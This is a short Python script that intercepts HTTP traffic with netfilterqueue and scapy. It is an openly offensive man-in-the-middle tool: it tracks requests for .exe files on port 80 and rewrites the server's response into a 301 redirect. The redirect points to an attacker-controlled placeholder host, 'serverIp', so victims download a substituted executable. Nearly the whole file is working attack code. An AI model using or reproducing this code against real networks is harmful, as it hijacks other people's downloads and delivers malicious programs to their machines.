#!/usr/bin/env python

# serverIp refers to your webserver Ex. Appache server with your desired file

import netfilterqueue
import scapy.all as scapy

# collect list of tcp handshakes
ack_list = []

# bypass packet checks
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# set packet to scan for .exe files on internet port and replace download url with desired server and file location
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # if your using better cap replace the ports with given port numbers
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load and "serverIP" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved permanently\nLocation: http://serverIp/Files/File.exe\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()

# configure ip tables and callback function
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
